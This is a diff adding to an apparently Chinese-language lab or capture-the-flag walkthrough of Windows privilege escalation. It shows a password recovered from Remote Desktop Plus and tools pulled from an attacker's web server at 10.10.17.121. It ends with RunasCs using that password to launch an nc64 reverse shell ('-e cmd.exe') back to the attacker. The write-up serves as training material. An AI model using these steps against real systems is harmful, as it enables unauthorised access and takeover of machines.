@@ -113,9 +113,75 @@ PS C:\temp> ./BPV.exe
 #### 程序显示隐藏密码为Twisting3021。注意：为了正确显示密码，远程桌面Plus需要在编辑中前面展示的配置文件页面。我们可以推测这个密码属于名为admin的用户。
 
 ```
+使用BulletsPassView.exe的事项：
+1.得到portect.xml
+
+
+注：
 Secure=False 的真实含义
 在 Remote Desktop Plus 里：
 Secure=True → DPAPI（用户 + 机器绑定）
 Secure=False → 程序内置密钥对称加密
 密钥是写死在程序里的
+```
+
+
+```
+PS C:\Users\kioskUser0> cd ..
+PS C:\Users> net user admin
+User name                    admin
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+Password last set            2/3/2024 2:45:01 AM
+Password expires             Never
+Password changeable          2/3/2024 2:45:01 AM
+Password required            No
+User may change password     Yes
+Workstations allowed         All
+User profile
+Home directory
+Last logon                   4/10/2025 10:26:42 PM
+Logon hours allowed          All
+Local Group Memberships      *Administrators
+Global Group memberships     *None
+The command completed successfully.
+```
+#### 我们很快发现这个用户是Administrators组的成员。让我们尝试登录到使用此用户远程系统。为此，我们可以使用RunasCs。在本地下载，然后上传到远程系统通过现有的Python web服务器。
+https://github.com/antonioCoco/RunasCs
+```
+-MacBook-Pro Downloads % curl -O https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/RunasCs.cs
+
+MacBook-Pro Downloads % python3 -m http.server 8026
+Serving HTTP on :: port 8026 (http://[::]:8026/) ...
+```
+```
+PS C:\temp> wget http://10.10.17.121:8026/RunasCs.cs -O RunasCs.cs
+```
+#### 我们也可以使用Windows版本的Netcat来将一个反向shell发送回我们的机器。让我们把这个也上传。
+https://github.com/vinsworldcom/NetCat64/releases
+```
+PS C:\temp> wget http://10.10.17.121:8026/nc64.exe -O nc64.exe
+```
+#### 需要现场编译RunasCs.cs为RunasCs.exe
+```
+PS C:\> where csc
+PS C:\> ls C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe //csc常见的位置
+Directory: C:\Windows\Microsoft.NET\Framework\v4.0.30319
+Mode                 LastWriteTime         Length Name
+-a----         3/11/2024   9:00 PM        2154992 csc.exe
+PS C:\> cd temp
+PS C:\temp> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:RunasCs.exe RunasCs.cs
+Microsoft (R) Visual C# Compiler version 4.8.9232.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+```
+
+```
+PS C:\temp> .\RunasCs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.17.121 1234 -e cmd.exe"
+[*] Warning: The logon for user 'admin' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
 ```
